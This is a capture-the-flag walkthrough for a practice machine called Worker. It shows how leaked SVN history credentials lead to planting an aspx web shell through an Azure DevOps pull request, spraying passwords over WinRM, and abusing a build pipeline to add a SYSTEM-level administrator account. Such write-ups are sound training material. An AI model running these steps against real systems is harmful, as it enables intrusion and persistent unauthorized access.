@@ -1,0 +1,158 @@
+Worker
+
+26th October 2020 / Document No D20.100.90
+Prepared By: cube0x0
+Machine Author(s): Ekenas
+Difficulty: Medium
+Classification: Official
+Synopsis
+
+Worker is a medium box that teaches about software development environments and Azure
+DevOps pipeline abuse. It starts with extraction of source code from a SVN server, and then
+moves to a local Azure DevOps installation, which can be abused to gain a foothold and escalate
+privileges.
+
+Skills Required
+
+      OWASP Top 10
+
+Skills Learned
+
+      Azure DevOps
+      SVN Repository
+      OWASP Top 10
+Enumeration
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.203 | grep ^[0-9] | cut -d '/' -f
+   1 | tr '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.203
+
+Nmap output shows that web (IIS), WinRM, and Subversion (svnserve) services are running on the
+box.
+On visiting port 80 we see the default IIS installation page.
+The availability of port 3690 indicates that an SVN repository is available. We can attempt to
+interact with it and download files using the svn command.
+
+We can issue the command svn checkout svn://10.10.10.203 to download the available files
+to our local machine. Looking at the output we can see a folder containing a static web site and
+text file.
+
+Inspection of the text file reveals that the repo has been migrated, and the FQDN of the website
+is devops.worker.htb .
+
+Lets write the two domains above to /etc/hosts with echo '10.10.10.203
+dimension.worker.htb devops.worker.htb' >> /etc/hosts
+On visiting dimension.worker.htb , we're presented with the site below.
+On visiting http://dimension.worker.htb/#work we see additional subdomain links for
+worker.htb . We can use cURL and grep to parse all the subdomains, and also add these to
+/etc/hosts .
+
+   curl -s http://dimension.worker.htb/#work | grep -oh 'http://.*worker.htb'
+
+   cat /etc/hosts
+   10.10.10.203 dimension.worker.htb devops.worker.htb alpha.worker.htb
+   cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb
+   story.worker.htb
+There doesn't seem to be anything of interest on any of these sites. Let's leave it for now and look
+again at the repo we downloaded. SVN repositories have a log feature that we can inspect with
+svn log .
+The second commit (r2) looks interesting, we can use svn update -r 2 to bring the changes
+from the repository into our working directory. The revision (r) integers are incremented with
+each new commit to the repository.
+
+From the command output above, we see that in this commit a file called moved.txt was
+deleted and a file named deploy.ps1 was added. Inspection of deploy.ps1 reveals credentials
+for the user nathen .
+These credentials don't work for WinRM, so we can instead look for any type of login functionality
+on the subdomains. The subdomain devops.worker.htb is configured to use basic
+authentication.
+
+After visiting the site devops.worker.htb with a browser and we can successfully login with the
+credentials nathen / wendel98 . We are presented with an Azure DevOps interface. We can also
+see that we have access to a project named SmartHotel360.
+Foothold
+
+As nathen, we can view build definitions and pipelines but not modify them. The Continuous
+integration build, Spectral-CI, copies the content of the repo to w:\sites\spectral.worker.htb .
+This indicates that we may be able to upload a web shell to w:\sites\spectral.worker.htb by
+pulling code to its master branch.
+
+Lets clone the repo to our local machine using git . This repo will be for the spectral subdomain.
+   apt -y install git
+   git clone
+   http://nathen:wendel98@devops.worker.htb/ekenas/SmartHotel360/_git/spectral
+
+Then we create a new branch with git checkout -b shell in the spectral directory.
+Next, we can copy a simple cmd aspx shell from /usr/share/webshells/aspx/cmdasp.aspx to
+our current directory, and upload the new file to the server.
+
+   cp /usr/share/webshells/aspx/cmdasp.aspx .
+   git add .
+   git commit -m 'updated with shell'
+
+Now we can push the commit to the Azure DevOps repository with:
+   git push -u origin shell
+We can use our browser to verify that the branch shell and the file cmdasp.aspx have been
+created. Next, click Create a pull request in order to merge this branch into the master
+branch.
+
+Set a Title, a Work item and then click Create .
+
+It will redirect you to a new interface where we can complete the pull request by clicking on
+Approve then Complete .
+if we visit http://spectral.worker.htb/cmdasp.aspx we can see that it has our shell uploaded
+to it, and executing whoami reveals that the service is running as iis apppool\defaultapppool .
+Basic OS enumeration shows us that an additional drive has been added to the machine,
+mounted on W , which we also saw from the build definition.
+
+Inspection of the W:\ drive reveals a svnrepos directory that contains a file called passwd .
+
+Inspecting w:\svnrepos\www\conf\passwd shows us a file that contains a list of usernames and
+passwords.
+We now have credential combinations to spray with CrackMapExec. Save the data to a file called
+passwd and parse the data with awk .
+
+   cat passwd | awk '{ print $1 }' > users
+   cat passwd | awk '{ print $3 }' > passwords
+   cme winrm 10.10.10.203 -u users -p passwords --no-bruteforce
+This reveals the valid credentials robisl / wolves11 . We can now use Evil-WinRM to connect to
+the machine over WinRM and read the user.txt .
+
+   evil-winrm -i 10.10.10.203 -u robisl -p wolves11
+Privilege Escalation
+
+There don't seem to be any common privilege escalation paths, so let's return to the Azure
+DevOps service.
+
+Logout from the DevOps portal as nathen , and login using robisl / wolves11 . After signing in
+we see that we have access to a new project called PartsUnlimited .
+
+After some enumeration inside this project we see that user robisl is a member of the "Build
+Administrators" group. This is interesting since Build Administrators have full control over the
+pipelines in the project. This means that we can create new build definitions to execute arbitrary
+commands.
+In order to discover in whose context the build definition is executed, as we can go to Project
+Settings > Agent pools > Setup > Agents > Hamilton11 > Capabilities . There, we see that
+the username of the agent is Worker$ which is the hostname, revealing that our build definitions
+will be running as SYSTEM.
+
+To abuse this, navigate to Pipelines > New Pipeline > Use the classic editor and click
+Continue .
+
+Select Empty pipeline at the bottom of the list of templates, and then click the Add button that
+becomes visible after selecting the template.
+In the Agent Pool choose Setup .
+
+We also need to configure the agent to do something. Again, there are many things the agent can
+do since the list of tasks is quite long, but let's use the PowerShell task. Click the + button on the
+agent job item to add a new task, choose the PowerShell task and then click Add .
+Click the new PowerShell task and set it to run it as Inline . This allows us to insert PowerShell
+code directly, and in the script block we can run net user cube Password123! /add ; net
+localgroup administrators cube /add to create an administrator user. Then click Save &
+Queue to start the job.
+
+We can now connect to the machine using Evil-WinRM and the credentials cube / Password123!
+and read the root.txt .
+
+   evil-winrm -i 10.10.10.203 -u cube -p Password123!
+
